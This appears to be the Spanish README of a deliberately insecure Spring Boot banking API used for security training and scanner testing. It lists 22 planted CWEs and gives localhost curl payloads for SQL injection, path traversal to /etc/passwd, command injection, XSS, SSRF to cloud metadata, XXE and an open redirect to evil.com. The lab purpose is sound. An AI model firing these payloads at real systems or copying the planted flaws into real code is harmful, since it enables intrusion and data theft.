# vulnerable-bank-api

[![Java](https://img.shields.io/badge/Java-21-ED8B00?logo=openjdk)](https://www.oracle.com/java/)
[![Spring Boot](https://img.shields.io/badge/Spring_Boot-3-6DB33F?logo=springboot)](https://spring.io/projects/spring-boot)
[![Maven](https://img.shields.io/badge/Maven-C71A36?logo=apachemaven)](https://maven.apache.org/)
[![OWASP Top 10](https://img.shields.io/badge/OWASP_Top_10-2021-000000?logo=owasp)](https://owasp.org/Top10/)
[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
[![CWE Coverage](https://img.shields.io/badge/CWEs-22%20implemented-blueviolet)](#vulnerabilidades-implementadas)

> [!CAUTION]
> Este proyecto es **intencionalmente inseguro**. Diseñado exclusivamente para fines educativos:
> laboratorios de seguridad, análisis estático/dinámico SAST/DAST, prácticas de pentesting
> en entornos controlados. **No desplegar en producción ni reutilizar como base real.**

---

<div align="center">
  <h2>Banco vulnerable con +20 fallos de seguridad reales</h2>
  <p><strong>17 endpoints · 22 CWEs · Severidades del 1 al 8 · 5 clases explotables</strong></p>
</div>

---

## Objetivo academico

Este repositorio sirve como _playground_ para equipos de seguridad y desarrolladores que quieran:

* Identificar vulnerabilidades **OWASP Top 10 (2021)** en codigo realista
* Practicar **explotacion controlada** y validacion de hallazgos
* Documentar impacto, riesgo y recomendaciones de mitigacion
* Probar herramientas **SAST/DAST** (SonarQube, Checkmarx, ZAP, Burp, etc.)

## Stack tecnologico

| Componente | Version | Proposito |
|---|---|---|
| Java | 21 | Plataforma base |
| Spring Boot | 3.3.x | Framework REST (sin Spring Security) |
| Maven | 3.9+ | Build y dependencias |
| MySQL (JDBC directo) | 8.x | Conexion a BBDD sin JPA/Hibernate |

## Decisiones intencionales (inseguras)

Estas malas practicas se aplican deliberadamente para generar hallazgos:

* Sin Spring Security
* Sin validacion de entradas (todas las requests se aceptan tal cual)
* Sin JPA/Hibernate -> JDBC crudo con `Statement` concatenado
* Sin manejo de excepciones adecuado
* Sin rate limiting, CSRF, CORS, ni sanitizacion de output

## Arquitectura

```mermaid
graph TB
    A[Cliente HTTP] --> B[Spring Boot 3<br/>Sin Seguridad]
    B --> C[UserController<br/>SQLi + Creds hardcodeadas]
    B --> D[CryptoController<br/>MD5 sin salt]
    B --> E[SystemController<br/>Path Traversal]
    B --> F[NetworkController<br/>OS Command Injection]
    B --> G[BadPracticesController<br/>Anti-patrones]
    B --> H[OwaspController<br/>13 vulnerabilidades OWASP]
    C --> I[(MySQL<br/>JDBC Statement)]
    F --> J[Runtime.exec()<br/>Comandos SO]
    H --> K[RestTemplate SSRF<br/>XXE · Deserializacion<br/>File Upload · JWT debil]
```

## Estructura del proyecto

```
src/main/java/com/amalakaky/vuln/
  VulnerableBankApiApplication.java   # Punto de entrada
  rest/
    UserController.java               # SQL Injection + credenciales hardcodeadas
    CryptoController.java             # Hashing debil (MD5)
    SystemController.java             # Path Traversal + anti-patrones
    NetworkController.java            # OS Command Injection
    BadPracticesController.java       # Malas practicas de codigo
    OwaspController.java              # ~13 endpoints OWASP Top 10
```

## Vulnerabilidades implementadas

### Originales

| Endpoint | Vulnerabilidad | CWE | Impacto |
|---|---|---|---|
| `GET /api/users/balance?username=...` | SQLi + Credenciales hardcodeadas | CWE-89, CWE-798 | Alto |
| `POST /api/crypto/hash?password=...` | Hash debil (MD5 sin salt) | CWE-327 | Medio |
| `GET /api/system/download?filename=...` | Path Traversal | CWE-22 | Alto |
| `POST /api/network/ping?ip=...` | OS Command Injection | CWE-78 | Critico |
| `GET /api/system/risk-score?...` | Anti-patrones (codigo espagueti) | N/A | Bajo |

### OWASP Controller — Cobertura Top 10 2021

| Endpoint | CWE | Descripcion | Severidad |
|---|---|---|---|
| `GET /api/owasp/xss/comment?text=...` | CWE-79 | Reflected XSS — script sin escapar | 3 |
| `POST /api/owasp/csrf/transfer` | CWE-352 | Sin token anti-CSRF ni validacion de origen | 4 |
| `GET /api/owasp/broken-acl/admin/profile` | CWE-862 | Broken Access Control — acceso sin autenticar | 5 |
| `GET /api/owasp/sensitive-data/users` | CWE-200 | Expone datos sensibles de usuarios reales | 2 |
| `POST /api/owasp/logging/credentials` | CWE-532 | Credenciales en log en texto plano | 3 |
| `POST /api/owasp/ssrf/fetch?url=...` | CWE-918 | SSRF — acceso a metadatos internos | 6 |
| `POST /api/owasp/deserialize` | CWE-502 | Insecure Deserialization | 8 |
| `POST /api/owasp/upload/malicious` | CWE-434 | Subida sin restriccion de tipo/contenido | 7 |
| `POST /api/owasp/xxe/parse` | CWE-611 | Procesamiento XML con entradas externas | 7 |
| `GET /api/owasp/rate-limit/loan-check` | CWE-400 | Sin rate limiting — busqueda masiva | 2 |
| `POST /api/owasp/jwt/weak-secret` | CWE-287 | JWT con clave HMAC debil `"secret"` | 6 |
| `GET /api/owasp/weak-crypto/encrypt?data=...` | CWE-326 | DES/ECB — cifrado roto | 5 |
| `GET /api/owasp/open-redirect?url=...` | CWE-601 | Open Redirect sin validacion | 4 |

### Severidad baja (INFO)

| Endpoint | CWE | Descripcion | Severidad |
|---|---|---|---|
| `GET /api/owasp/debug/error-details?filepath=...` | CWE-209 | Error messages con rutas internas y trazas | 1 |
| `POST /api/owasp/log/inject?message=...` | CWE-117 | Log Injection — input sin sanitizar | 1 |
| `GET /api/owasp/debug/security-config` | CWE-547 | Constantes de seguridad hardcodeadas | 1 |
| `GET /api/owasp/debug/dependencies` | CWE-1104 | Version de dependencias con CVEs conocidos | 1 |

### Resumen de cobertura

```mermaid
quadrantChart
    title Severidad vs Tipo
    x-axis Bajo Impacto --> Alto Impacto
    y-axis Baja Probabilidad --> Alta Probabilidad
    quadrant-1 Critico (Priorizar)
    quadrant-2 Alto
    quadrant-3 Medio
    quadrant-4 Info / Bajo
    OS Command Injection: [0.85, 0.90]
    Insecure Deserialization: [0.80, 0.75]
    XXE: [0.75, 0.70]
    File Upload: [0.80, 0.65]
    JWT Weak Secret: [0.70, 0.60]
    SSRF: [0.65, 0.55]
    Path Traversal: [0.75, 0.50]
    Broken ACL: [0.60, 0.65]
    Weak Crypto: [0.55, 0.60]
    Open Redirect: [0.40, 0.70]
    SQL Injection: [0.90, 0.85]
    XSS: [0.30, 0.80]
    CSRF: [0.35, 0.60]
    Sensitive Data: [0.25, 0.40]
    Logging Creds: [0.20, 0.35]
    Rate Limiting: [0.15, 0.25]
    Log Injection: [0.10, 0.20]
    Error Details: [0.05, 0.30]
    Hardcoded Config: [0.08, 0.15]
    Dependencies Info: [0.03, 0.10]
```

## Clase de malas practicas

`BadPracticesController` incluye anti-patrones clasicos de forma intencional:

| Anti-patron | Descripcion |
|---|---|
| `if` encadenados (10+ niveles) | Logica imposible de mantener |
| `return` tempranos multiples | Flujo de control caotico |
| Numeros magicos | Constantes sin nombre esparcidas |
| Estado mutable global | `globalCounter` accesible desde cualquier hilo |
| Catch generico | `Exception e` sin log ni manejo |

## Ejecucion local

```bash
cd "C:\Users\skull\IdeaProjects\vulnerable-bank-api"
mvn spring-boot:run
```

La aplicacion arranca en `http://localhost:8080`.

## Ejemplos rapidos

### Originales

```bash
# SQL Injection
curl "http://localhost:8080/api/users/balance?username=alice"
curl "http://localhost:8080/api/users/balance?username=' OR '1'='1"

# Path Traversal
curl "http://localhost:8080/api/system/download?filename=../../../etc/passwd"

# Command Injection
curl -X POST "http://localhost:8080/api/network/ping?ip=127.0.0.1; ls -la"

# MD5 sin salt
curl -X POST "http://localhost:8080/api/crypto/hash?password=123456"
```

### OWASP Top 10

```bash
# XSS
curl "http://localhost:8080/api/owasp/xss/comment?text=<script>alert(1)</script>"

# CSRF
curl -X POST "http://localhost:8080/api/owasp/csrf/transfer?amount=1000&to=atacante"

# SSRF (meta-data AWS)
curl -X POST "http://localhost:8080/api/owasp/ssrf/fetch?url=http://169.254.169.254/latest/meta-data/"

# XXE
curl -X POST "http://localhost:8080/api/owasp/xxe/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Open Redirect
curl -X POST "http://localhost:8080/api/owasp/open-redirect?url=https://evil.com"
```

### Severidad baja (INFO / hallazgos cosmeticos)

```bash
# Error details con rutas internas
curl "http://localhost:8080/api/owasp/debug/error-details?filepath=/etc/passwd"

# Log Injection
curl -X POST "http://localhost:8080/api/owasp/log/inject?message=Inicio%20de%20sesion%20exitoso%20para%20admin"

# Configuracion de seguridad hardcodeada
curl "http://localhost:8080/api/owasp/debug/security-config"

# Versiones de dependencias con CVEs
curl "http://localhost:8080/api/owasp/debug/dependencies"
```

---

> **Proyecto orientado a docencia en ciberseguridad.**
> No desplegar en produccion ni reutilizar este codigo como base de sistemas reales.
